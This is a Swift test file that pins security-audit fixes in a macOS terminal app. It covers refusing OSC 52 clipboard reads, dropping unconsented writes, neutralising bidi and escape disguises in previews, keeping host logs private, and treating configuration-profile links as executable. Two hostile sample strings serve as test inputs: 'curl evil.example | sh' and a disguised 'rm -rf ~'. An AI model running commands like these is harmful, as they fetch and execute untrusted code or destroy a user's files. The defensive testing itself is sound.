import AppKit
import Foundation
import Testing
@testable import Moo

/// Pins the fixes from the 0.1.4 security audit, so none of them can quietly
/// come undone.
@MainActor
struct AuditHardeningTests {

    // MARK: OSC 52

    /// An OSC 52 read must never be answered. Answering hands the clipboard —
    /// often a password just pasted from a password manager — to whatever runs
    /// in the pane, including a remote host over ssh, with nothing on screen.
    @Test func clipboardReadsAreRefused() {
        let pasteboard = NSPasteboard.general
        let saved = pasteboard.string(forType: .string)
        defer {
            pasteboard.clearContents()
            if let saved { pasteboard.setString(saved, forType: .string) }
        }
        pasteboard.clearContents()
        pasteboard.setString("hunter2", forType: .string)

        let view = AppTerminalView(frame: NSRect(x: 0, y: 0, width: 200, height: 100))
        #expect(view.clipboardRead(source: view) == nil)
    }

    /// With no session to ask, a write has nobody to consent and is dropped
    /// rather than applied.
    @Test func clipboardWritesWithoutConsentAreDropped() {
        let pasteboard = NSPasteboard.general
        let saved = pasteboard.string(forType: .string)
        defer {
            pasteboard.clearContents()
            if let saved { pasteboard.setString(saved, forType: .string) }
        }
        pasteboard.clearContents()
        pasteboard.setString("mine", forType: .string)

        let view = AppTerminalView(frame: NSRect(x: 0, y: 0, width: 200, height: 100))
        view.clipboardCopy(source: view, content: Data("curl evil.example | sh\n".utf8))
        #expect(pasteboard.string(forType: .string) == "mine")
    }

    /// The prompt shows the pending write as data: controls and bidi overrides
    /// cannot disguise what will land on the clipboard.
    @Test func clipboardPreviewNeutralizesDisguises() {
        let preview = TerminalSessionController.clipboardPreview(
            "ls\u{202E}hs.lived\u{1b}[2J\nrm -rf ~"
        )
        #expect(!preview.contains("\u{202E}"))
        #expect(!preview.contains("\u{1b}"))
        // Line breaks stay visible rather than vanishing.
        #expect(preview.contains("\u{21B5}"))
        #expect(preview.contains("rm -rf ~"))
    }

    @Test func clipboardPreviewSaysWhenItCuts() {
        let long = String(repeating: "a", count: 1_000)
        let preview = TerminalSessionController.clipboardPreview(long)
        #expect(preview.count < long.count)
        #expect(preview.contains("more)"))
    }

    // MARK: host output logs

    /// Logs hold everything the shell printed, so the directory is private and
    /// is not under Downloads.
    @Test func hostLogsLiveInAPrivateDirectory() throws {
        let home = FileManager.default.temporaryDirectory
            .appendingPathComponent("moo-log-test-\(UUID().uuidString)", isDirectory: true)
        defer { try? FileManager.default.removeItem(at: home) }

        let path = try #require(TerminalSessionController.hostLogDirectory(home: home))
        #expect(path.hasSuffix("Library/Logs/Moo"))
        #expect(!path.contains("Downloads"))

        let attributes = try FileManager.default.attributesOfItem(atPath: path)
        let mode = (attributes[.posixPermissions] as? NSNumber)?.intValue ?? -1
        #expect(mode == 0o700, "log directory must be readable by this user only")
    }

    /// A shared profile must not be able to switch on logging of every pane.
    @Test func importedProfilesCannotEnableHostLogging() {
        #expect(!AppSettings.all.contains { $0.key == "LogHostOutput" })
    }

    // MARK: link routing

    /// A configuration profile is one click from System Settings' installer,
    /// so it is revealed rather than opened, like an executable.
    @Test func configurationProfilesAreTreatedAsExecutable() {
        for ext in ["mobileconfig", "prefPane", "saver", "plugin", "qlgenerator"] {
            let url = URL(fileURLWithPath: "/tmp/moo-audit-test.\(ext)")
            #expect(LinkRouter.isExecutable(url), "\(ext) should not open directly")
        }
    }
}
